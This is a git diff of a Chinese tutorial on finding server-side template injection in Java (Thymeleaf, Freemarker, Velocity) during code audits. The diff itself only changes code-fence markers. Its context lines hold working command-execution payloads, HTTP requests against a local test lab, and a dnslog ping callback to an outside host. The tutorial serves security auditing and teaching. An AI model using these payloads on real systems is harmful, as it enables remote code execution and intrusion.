@@ -7,7 +7,7 @@ tags: [ssti, 模板注入, 服务端, jinja2, tornado]
 
 ## 1 SSTI注入是什么?
 
-```plain
+```
 SSTI也叫服务器端模板注入(Server-Side Template Injection)
 在如今的开发中已经形成了非常成熟的MVC模式,也就是模型(Model)-视图(View)-控制器(Controller)
 其中,视图(View),也就是特指的Web开发的模版引擎,是为了使HTML界面与业务数据分离而产生的一种技术
@@ -16,7 +16,7 @@ SSTI也叫服务器端模板注入(Server-Side Template Injection)
 
 ## <font style="color:rgb(0, 0, 0);">2 漏洞成因</font>
 
-```plain
+```
 在业务中常常存在于后台编辑模板这种功能
 漏洞成因是因为服务器接收了外部的输入,在过滤不严格的情况下就将其作为Web应用模版内容的一部分
 在站点编译渲染的过程中,执行了外部插入的恶意内容,从而达到敏感信息泄露、代码执行等目的...
@@ -25,13 +25,13 @@ SSTI也叫服务器端模板注入(Server-Side Template Injection)
 
 ## 3 审计策略
 
-```plain
+```
 对于这种漏洞,可以先看看是否有这些常见的模版引擎库,然后查看版本,接着查看是否外部可控,最后尝试利用
 理论上,如果模版引擎的视图外部可控那么就可能产生问题,需要根据实际的源码进行挖掘
 注意: 这里只列举最常用的模版引擎
 ```
 
-```plain
+```
 Thymeleaf:
 
 审计策略一:
@@ -66,13 +66,13 @@ public void test3(@PathVariable String data) {
 }
 ```
 
-```plain
+```
 Freemarker:
 查找该源码中有没有出现: freemarker-xxx.jar
 如果有该jar,那就查看该源码中的视图文件能不能被外部修改,如果可以,说明可能有SSTI
 ```
 
-```plain
+```
 Velocity:
 查找该源码中有没有出现: velocity-xxx.jar
 如果有该jar,那就查看该源码中的视图文件能不能被外部修改,如果可以,说明可能有SSTI
@@ -80,20 +80,20 @@ Velocity:
 
 ## 4 修复方法
 
-```plain
+```
 代码中避免外部可控,如果实在需要外部可控,也需要过滤好才能带入模版引擎中执行,防止恶意解析
 ```
 
 ## 5 例子
 ## 5.1 概述
 
-```plain
+```
 本示例列举了Java代码审计中最基础的SSTI模版注入环境,读者们可以根据示例来学习该漏洞,并进行举一反三
 ```
 
 ## 5.2 测试环境目录
 
-```plain
+```
 // 目录结构
 ├── src
 │ ├── main
@@ -202,7 +202,7 @@ Velocity:
 ## 5.4 Thymeleaf
 ### 5.4.1 常用POC
 
-```plain
+```
 {% raw %}
 POC格式:
 ${expr}::x
@@ -219,7 +219,7 @@ __*{{expr}}__::x (推荐使用)
 {% endraw %}
 ```
 
-```plain
+```
 SpEL-POC例子:
 
 测试是否有SSTI:
@@ -231,7 +231,7 @@ __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputS
 
 ### 5.4.2 注意项
 
-```plain
+```
 注意: 如果Web应用程序基于Spring那么Thymeleaf使用SpEL,否则Thymeleaf使用OGNL
 
 以下为使用例子:
@@ -377,7 +377,7 @@ public class ThymeleafTest {
 ### 5.4.4 漏洞测试
 #### 5.4.4.1 test路由
 
-```plain
+```
 // test路由,漏洞测试数据包,测试SSTI是否存在
 POST /SpringMVCtest_war/ThymeleafTest/test HTTP/1.1
 Host: 127.0.0.1:8081
@@ -392,7 +392,7 @@ path=aaa__${7*7}__bbb::x
 
 
 
-```plain
+```
 //  test路由,漏洞测试数据包,命令执行测试
 POST /SpringMVCtest_war/ThymeleafTest/test HTTP/1.1
 Host: 127.0.0.1:8081
@@ -407,7 +407,7 @@ path=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").
 
 #### 5.4.4.2 test2路由
 
-```plain
+```
 // test2路由,漏洞测试数据包
 // 遇到类似的代码,可以通过dnslog确认漏洞
 POST /SpringMVCtest_war/ThymeleafTest/test2 HTTP/1.1
@@ -427,7 +427,7 @@ section=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("ping -
 
 #### 5.4.4.3 test3路由
 
-```plain
+```
 // test3路由,漏洞测试数据包
 // 遇到类似的代码,可以通过dnslog确认漏洞
 GET /SpringMVCtest_war/ThymeleafTest/test3/__%24%7BT(java.lang.Runtime).getRuntime().exec(%22ping%20-c%201%20f123.vf3si4.dnslog.cn%22)%7D__%3A%3A.x HTTP/1.1
@@ -442,7 +442,7 @@ Connection: close
 
 #### 5.4.4.4 test4路由
 
-```plain
+```
 // test4路由,漏洞测试数据包
 POST /SpringMVCtest_war/ThymeleafTest/test4 HTTP/1.1
 Host: 127.0.0.1:8081
@@ -460,7 +460,7 @@ data=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").
 
 
 
-```plain
+```
 // 第一步
 // 修改模版文件内容为恶意的
 POST /SpringMVCtest_war/ThymeleafTest/saveView HTTP/1.1
@@ -476,7 +476,7 @@ data=<h3 th:text="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec
 
 
 
-```plain
+```
 // 第二步,访问test5路由
 GET /SpringMVCtest_war/ThymeleafTest/test5 HTTP/1.1
 Host: 127.0.0.1:8081
@@ -488,7 +488,7 @@ Connection: close
 ## 5.5 Freemarker
 ### 5.5.1 常用POC
 
-```plain
+```
 测试是否有SSTI:
 <#assign test="test123456"/>${test}
 如果页面输出了test123456说明有SSTI
@@ -606,7 +606,7 @@ public class FreeMarkerTest {
 ![pasted image 20260618084355](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084355.png)
 
 
-```plain
+```
 // 修改视图内容,测试SSTI是否存在
 POST /SpringMVCTest2_war/FreeMarkerTest/saveView HTTP/1.1
 Host: 127.0.0.1:8081
@@ -632,7 +632,7 @@ Connection: close
 
 
 
-```plain
+```
 // test路由,漏洞测试数据包,命令执行测试
 POST /SpringMVCTest2_war/FreeMarkerTest/saveView HTTP/1.1
 Host: 127.0.0.1:8081
@@ -658,7 +658,7 @@ Connection: close
 ## 5.6 Velocity
 ### 5.5.1 常用POC
 
-```plain
+```
 测试是否有SSTI:
 #set($x="test123456")${x}
 如果页面输出了test123456说明有SSTI
@@ -763,7 +763,7 @@ public class VelocityTest {
 
 
 
-```plain
+```
 // 修改视图内容,测试SSTI是否存在
 POST /SpringMVCTest2_war/VelocityTest/saveView HTTP/1.1
 Host: 127.0.0.1:8081
@@ -789,7 +789,7 @@ Connection: close
 
 
 
-```plain
+```
 // test路由,漏洞测试数据包,命令执行测试
 POST /SpringMVCTest2_war/VelocityTest/saveView HTTP/1.1
 Host: 127.0.0.1:8081
